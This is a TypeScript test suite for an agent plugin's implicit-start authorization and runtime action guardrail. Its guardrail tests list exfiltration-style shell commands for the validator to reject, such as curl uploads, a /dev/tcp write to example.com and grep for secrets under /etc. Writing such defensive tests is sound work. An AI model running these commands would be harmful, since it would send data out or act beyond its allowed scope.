// v0.7.0 隐式启动权限硬校验（ADR 0034）：默认拒绝、越界策略拒绝、冷会话要求。
import { describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { __executeDgoalProposeForTest, __getPendingProposalForTest, __resetGoalForTest, __setGoalForTest, __setProposalSemanticReviewForTest, dgoalProposeTool, validateImplicitToolAction, type GoalState } from "../index.ts";
import { buildImplicitStartGuidance } from "../src/startup/index.ts";

const criterion = { criterion: "测试退出码 0", evidence: "npm test" };

describe("v0.7.0 · 隐式轻量启动权限", () => {
  test("冷启动提示明确隐式入口与安全策略", () => {
    const guidance = buildImplicitStartGuidance();
    expect(guidance).toContain("implicit=true");
    expect(guidance).toContain("final_only + bounded");
    expect(guidance).toContain("用户明确要求启动 dgoal");
    expect(guidance).toContain("没有明确用户目标时不要自行启动");
    expect(guidance).toContain("显式使用 /dgoal");
  });

  test("dgoal_propose implicit 描述明确不要求显式 /dgoal", () => {
    const implicitParam = String((dgoalProposeTool.parameters as { properties?: { implicit?: { description?: string } } }).properties?.implicit?.description ?? "");
    expect(implicitParam).toContain("不要求用户输入 /dgoal");
    expect(implicitParam).toContain("final_only + bounded");
  });

  test("全局显式授权可成功进入 pending proposal，项目配置不能替代全局授权", async () => {
    __resetGoalForTest();
    __setProposalSemanticReviewForTest(() => ({ decision: "approve", acceptanceCriteria: [criterion] }));
    const root = await mkdtemp(path.join(os.tmpdir(), "pi-dgoal-implicit-"));
    const agentDir = path.join(root, "agent");
    const projectDir = path.join(root, "project");
    await mkdir(agentDir, { recursive: true });
    await mkdir(path.join(projectDir, ".pi"), { recursive: true });
    await writeFile(path.join(agentDir, "pi-dgoal.json"), JSON.stringify({
      implicitFinalOnlyStart: true,
      implicitFinalOnlyBudget: { maxTurns: 24, maxWallClockMinutes: 60, maxRepairAttempts: 1, grace: { maxTurns: 24, maxWallClockMinutes: 0 } },
    }));
    await writeFile(path.join(projectDir, ".pi", "pi-dgoal.json"), JSON.stringify({ implicitFinalOnlyStart: false }));
    const r = await __executeDgoalProposeForTest({
      objective: "轻量任务", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "final_only", budgetPolicyRecommendation: "bounded",
      runtimeBudget: { maxTurns: 999, maxWallClockMinutes: 999, maxRepairAttempts: 999 },
      acceptanceCriteria: [criterion], phases: [{ subject: "p", tasks: [{ subject: "t" }] }],
    }, { cwd: projectDir, agentDir, isProjectTrusted: () => true });
    expect(r.details?.error).toBeUndefined();
    expect(__getPendingProposalForTest()?.proposal.verificationPolicyRecommendation).toBe("final_only");
    expect(__getPendingProposalForTest()?.proposal.runtimeBudget).toEqual({ maxTurns: 24, maxWallClockMinutes: 60, maxRepairAttempts: 1, grace: { maxTurns: 24, maxWallClockMinutes: 0 } });
    __setProposalSemanticReviewForTest(undefined);
  });

  test("项目配置单独开启不能授权 implicit=true", async () => {
    __resetGoalForTest();
    const root = await mkdtemp(path.join(os.tmpdir(), "pi-dgoal-project-only-"));
    const agentDir = path.join(root, "agent");
    const projectDir = path.join(root, "project");
    await mkdir(agentDir, { recursive: true });
    await mkdir(path.join(projectDir, ".pi"), { recursive: true });
    await writeFile(path.join(projectDir, ".pi", "pi-dgoal.json"), JSON.stringify({ implicitFinalOnlyStart: true }));
    const r = await __executeDgoalProposeForTest({
      objective: "o", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "final_only", budgetPolicyRecommendation: "bounded",
      runtimeBudget: { maxTurns: 4 }, acceptanceCriteria: [criterion], phases: [{ subject: "p", tasks: [{ subject: "t" }] }],
    }, { cwd: projectDir, agentDir, isProjectTrusted: () => true });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("implicit start not authorized");
  });

  test("全局未授权 implicit=true 被拒绝", async () => {
    __resetGoalForTest();
    const root = await mkdtemp(path.join(os.tmpdir(), "pi-dgoal-no-global-auth-"));
    const agentDir = path.join(root, "agent");
    await mkdir(agentDir, { recursive: true });
    const r = await __executeDgoalProposeForTest({
      objective: "轻量任务", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "final_only", budgetPolicyRecommendation: "bounded",
      runtimeBudget: { maxTurns: 4, maxRepairAttempts: 1 },
      acceptanceCriteria: [criterion], phases: [{ subject: "p", tasks: [{ subject: "t" }] }],
    }, { cwd: "/tmp", agentDir });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("implicit start not authorized");
  });

  test("implicit + phased 被拒绝（越界策略）", async () => {
    __resetGoalForTest();
    const r = await __executeDgoalProposeForTest({
      objective: "o", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "phased", budgetPolicyRecommendation: "bounded",
      runtimeBudget: { maxTurns: 4, maxRepairAttempts: 1 },
      acceptanceCriteria: [criterion], phases: [{ subject: "p", acceptanceCriteria: [criterion] }],
    }, { cwd: "/tmp" });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("implicit policy violation");
  });

  test("implicit + unbounded 被拒绝（越界预算）", async () => {
    __resetGoalForTest();
    const r = await __executeDgoalProposeForTest({
      objective: "o", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "final_only", budgetPolicyRecommendation: "unbounded",
      acceptanceCriteria: [criterion], phases: [{ subject: "p", tasks: [{ subject: "t" }] }],
    }, { cwd: "/tmp" });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("implicit policy violation");
  });

  test("implicit 越界动作（部署）被拒绝", async () => {
    __resetGoalForTest();
    const r = await __executeDgoalProposeForTest({
      objective: "安全任务", verification: "npm test", implicit: true,
      verificationPolicyRecommendation: "final_only", budgetPolicyRecommendation: "bounded",
      runtimeBudget: { maxTurns: 4, maxRepairAttempts: 1 },
      acceptanceCriteria: [criterion], phases: [{
        subject: "p",
        description: "完成后 git push 到远端",
        acceptanceCriteria: [{ criterion: "检查 task description", evidence: "git push" }],
        tasks: [{ subject: "本地检查", description: "deploy to production" }],
      }],
    }, { cwd: "/tmp" });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("implicit action out of scope");
  });

  test("运行时动作护栏拒绝 shell 外部写、未知外部工具和变体", async () => {
    const root = await mkdtemp(path.join(os.tmpdir(), "pi-dgoal-symlink-"));
    const outside = await mkdtemp(path.join(os.tmpdir(), "pi-dgoal-outside-"));
    await symlink(outside, path.join(root, "linked-outside"));
    expect(validateImplicitToolAction("write", { path: "linked-outside/new.txt" }, root)).toContain("outside");
    expect(validateImplicitToolAction("edit", { path: "linked-outside" }, root)).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "touch linked-outside/new.txt" }, root)).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "cp README.md linked-outside/new.txt" }, root)).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "curl -d payload https://example.com" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "git -C /tmp/repo push origin main" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "curl --upload-file payload https://example.com/upload" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "python3 -c \"urllib.request.urlopen('https://example.com', data=b'x')\"" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "npm test; printf POST >/dev/tcp/example.com/80" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "rm ~/outside" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "touch $HOME/outside" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "npm test && curl https://example.com" })).toContain("outside");
    expect(validateImplicitToolAction("http_request", { method: "POST", url: "https://example.com" })).toContain("outside");
    expect(validateImplicitToolAction("browser-act", { action: "click" })).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "bun test test/implicit-start-authorization.test.ts" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "npm test" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("bash", { command: "git diff --output=/tmp/implicit-out" }, process.cwd())).toContain("disallowed");
    expect(validateImplicitToolAction("bash", { command: "git diff --ext-diff" }, process.cwd())).toContain("disallowed");
    expect(validateImplicitToolAction("bash", { command: "bun test --reporter-outfile=/tmp/result.xml" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("grep", { path: "/etc", pattern: "secret" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("find", { path: "~" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("read", { path: "README.md" }, process.cwd())).toBeUndefined();
    expect(validateImplicitToolAction("write", { path: "package.json" }, process.cwd())).toContain("manifest");
    expect(validateImplicitToolAction("write", { path: "/tmp/outside.txt" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("edit", { path: "../outside.txt" }, process.cwd())).toContain("outside");
    expect(validateImplicitToolAction("tinyfish_search", { query: "docs" })).toBeUndefined();
  });

  test("unbounded + runtimeBudget 在显式 proposal 层也被拒绝", async () => {
    __resetGoalForTest();
    __setGoalForTest({ id: "g", objective: "o", status: "pending", startedAt: 1, updatedAt: 1, iteration: 0 } as GoalState);
    const r = await __executeDgoalProposeForTest({
      objective: "o", verification: "npm test", verificationPolicyRecommendation: "final_only",
      budgetPolicyRecommendation: "unbounded", runtimeBudget: { maxTurns: 4 }, acceptanceCriteria: [criterion],
      phases: [{ subject: "p", tasks: [{ subject: "t" }] }],
    });
    expect(r.isError).toBe(true);
    expect(String(r.details?.error)).toContain("unbounded runtime budget");
  });
});
